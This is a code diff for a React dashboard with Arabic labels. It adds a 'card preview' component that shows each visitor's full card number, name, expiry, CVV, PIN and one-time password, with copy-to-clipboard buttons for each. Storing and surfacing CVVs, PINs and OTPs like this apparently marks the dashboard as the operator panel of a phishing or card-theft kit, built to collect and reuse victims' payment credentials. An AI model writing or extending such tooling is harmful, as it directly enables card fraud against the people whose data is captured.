@@ -322,6 +322,175 @@ function VisitorListItem({
   );
 }
 
+function detectBrand(num: string): { name: string; gradient: string } {
+  const n = num.replace(/\s/g, "");
+  if (/^4/.test(n)) return { name: "VISA", gradient: "from-indigo-600 via-blue-700 to-blue-900" };
+  if (/^(5[1-5]|2[2-7])/.test(n)) return { name: "MASTERCARD", gradient: "from-red-600 via-orange-600 to-yellow-600" };
+  if (/^3[47]/.test(n)) return { name: "AMEX", gradient: "from-emerald-600 via-teal-700 to-cyan-800" };
+  if (/^6/.test(n)) return { name: "DISCOVER", gradient: "from-orange-500 via-amber-600 to-orange-800" };
+  return { name: "CARD", gradient: "from-zinc-700 via-zinc-800 to-black" };
+}
+
+function formatCardNumber(num: string): string {
+  const digits = String(num || "").replace(/\D/g, "");
+  return digits.replace(/(.{4})/g, "$1 ").trim();
+}
+
+function CardMockup({
+  cardNumber,
+  cardName,
+  expiryDate,
+  cvv,
+  cardPin,
+  cardOtp,
+  bank,
+  onCopy,
+  copiedKey,
+}: {
+  cardNumber?: string;
+  cardName?: string;
+  expiryDate?: string;
+  cvv?: string;
+  cardPin?: string;
+  cardOtp?: string;
+  bank?: string;
+  onCopy: (key: string, value: any) => void;
+  copiedKey: string | null;
+}) {
+  const brand = detectBrand(cardNumber || "");
+  const formatted = formatCardNumber(cardNumber || "");
+
+  return (
+    <div className="space-y-3">
+      {/* Card front */}
+      <div
+        dir="ltr"
+        className={cn(
+          "relative aspect-[1.586/1] w-full max-w-md mx-auto rounded-2xl overflow-hidden shadow-2xl border border-white/10 p-5 sm:p-6 flex flex-col justify-between text-white bg-gradient-to-br",
+          brand.gradient
+        )}
+        data-testid="card-mockup"
+      >
+        {/* Decorative shapes */}
+        <div className="absolute -top-12 -right-12 w-48 h-48 rounded-full bg-white/10 blur-2xl" />
+        <div className="absolute -bottom-16 -left-8 w-56 h-56 rounded-full bg-black/30 blur-2xl" />
+
+        {/* Top row: chip + brand */}
+        <div className="relative flex items-start justify-between">
+          <div className="flex flex-col gap-1.5">
+            {/* EMV chip */}
+            <div className="w-11 h-8 rounded-md bg-gradient-to-br from-yellow-300 via-amber-400 to-yellow-600 shadow-inner relative overflow-hidden">
+              <div className="absolute inset-1 grid grid-cols-3 gap-px">
+                {[...Array(9)].map((_, i) => (
+                  <div key={i} className="bg-yellow-700/40 rounded-sm" />
+                ))}
+              </div>
+            </div>
+            {/* Contactless icon */}
+            <svg className="w-5 h-5 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
+              <path d="M5 8a14 14 0 0 1 0 8" />
+              <path d="M9 6a18 18 0 0 1 0 12" />
+              <path d="M13 4a22 22 0 0 1 0 16" />
+            </svg>
+          </div>
+          <div className="text-right">
+            {bank && <div className="text-[10px] uppercase tracking-widest text-white/70 mb-1">{bank}</div>}
+            <div className="text-base sm:text-lg font-extrabold italic tracking-wider drop-shadow">{brand.name}</div>
+          </div>
+        </div>
+
+        {/* Card number */}
+        <button
+          onClick={() => onCopy("mockup-cardNumber", cardNumber)}
+          className="relative text-left group"
+          aria-label="نسخ رقم البطاقة"
+          data-testid="button-copy-mockup-cardNumber"
+        >
+          <div className="font-mono text-lg sm:text-2xl font-bold tracking-[0.18em] sm:tracking-[0.22em] drop-shadow-lg break-all leading-none">
+            {formatted || "•••• •••• •••• ••••"}
+          </div>
+          <div className="text-[10px] text-white/70 mt-2 flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
+            {copiedKey === "mockup-cardNumber" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
+            {copiedKey === "mockup-cardNumber" ? "تم النسخ" : "اضغط للنسخ"}
+          </div>
+        </button>
+
+        {/* Bottom row: holder + expiry */}
+        <div className="relative flex items-end justify-between gap-4">
+          <div className="min-w-0 flex-1">
+            <div className="text-[9px] uppercase tracking-widest text-white/60 mb-1">Card Holder</div>
+            <div className="text-sm sm:text-base font-bold uppercase truncate" data-testid="text-mockup-name">
+              {cardName || "—"}
+            </div>
+          </div>
+          <div className="text-right">
+            <div className="text-[9px] uppercase tracking-widest text-white/60 mb-1">Expires</div>
+            <div className="text-sm sm:text-base font-bold font-mono" data-testid="text-mockup-expiry">
+              {expiryDate || "MM/YY"}
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* Card back (CVV strip) */}
+      <div
+        dir="ltr"
+        className="relative aspect-[1.586/0.55] w-full max-w-md mx-auto rounded-2xl overflow-hidden shadow-xl border border-white/10 bg-gradient-to-br from-zinc-800 to-zinc-950 p-3 flex items-center"
+      >
+        <div className="absolute inset-x-0 top-3 h-8 bg-black" />
+        <div className="relative ml-auto flex items-center gap-2 bg-white/95 text-zinc-900 px-3 py-1.5 rounded-md shadow-md">
+          <span className="text-[9px] font-semibold text-zinc-500 uppercase">CVV</span>
+          <button
+            onClick={() => onCopy("mockup-cvv", cvv)}
+            className="font-mono font-bold text-base tracking-widest"
+            aria-label="نسخ CVV"
+            data-testid="button-copy-mockup-cvv"
+          >
+            {cvv || "•••"}
+          </button>
+          {copiedKey === "mockup-cvv" && <Check className="h-3 w-3 text-emerald-600" />}
+        </div>
+      </div>
+
+      {/* Extras row: PIN + OTP */}
+      {(cardPin || cardOtp) && (
+        <div dir="rtl" className="grid grid-cols-2 gap-2 max-w-md mx-auto">
+          {cardPin && (
+            <button
+              onClick={() => onCopy("mockup-pin", cardPin)}
+              className="rounded-xl border border-amber-500/30 bg-amber-500/10 hover:bg-amber-500/15 p-3 text-right transition-colors"
+              data-testid="button-copy-mockup-pin"
+            >
+              <div className="text-[10px] text-amber-300/80 mb-1 flex items-center gap-1">
+                <Lock className="h-3 w-3" />
+                PIN
+              </div>
+              <div className="font-mono font-bold text-base text-amber-100" dir="ltr">
+                {cardPin}
+              </div>
+            </button>
+          )}
+          {cardOtp && (
+            <button
+              onClick={() => onCopy("mockup-otp", cardOtp)}
+              className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 hover:bg-emerald-500/15 p-3 text-right transition-colors"
+              data-testid="button-copy-mockup-otp"
+            >
+              <div className="text-[10px] text-emerald-300/80 mb-1 flex items-center gap-1">
+                <Hash className="h-3 w-3" />
+                OTP
+              </div>
+              <div className="font-mono font-bold text-base text-emerald-100" dir="ltr">
+                {cardOtp}
+              </div>
+            </button>
+          )}
+        </div>
+      )}
+    </div>
+  );
+}
+
 function FieldCard({
   label,
   value,
@@ -649,6 +818,32 @@ export default function Dashboard() {
               {/* Sections grid */}
               <ScrollArea className="flex-1">
                 <div className="p-4 sm:p-6 grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4">
+                  {/* Card mockup — spans full width when payment data exists */}
+                  {selected.cardNumber && (
+                    <section
+                      className="rounded-2xl border border-white/10 bg-[#17212b] overflow-hidden lg:col-span-2 xl:col-span-3"
+                      data-testid="section-card-mockup"
+                    >
+                      <header className="px-4 py-3 flex items-center gap-2 bg-gradient-to-l from-violet-500 to-purple-600 border-b border-white/10">
+                        <CreditCard className="h-4 w-4 text-white" />
+                        <h3 className="text-sm font-bold text-white">معاينة البطاقة</h3>
+                      </header>
+                      <div className="p-5">
+                        <CardMockup
+                          cardNumber={selected.cardNumber}
+                          cardName={selected.cardName}
+                          expiryDate={selected.expiryDate}
+                          cvv={selected.cvv}
+                          cardPin={selected.cardPin}
+                          cardOtp={selected.cardOtp}
+                          bank={selected.bank}
+                          onCopy={handleCopy}
+                          copiedKey={copiedKey}
+                        />
+                      </div>
+                    </section>
+                  )}
+
                   {sectionsForSelected.map((section) => (
                     <section
                       key={section.key}
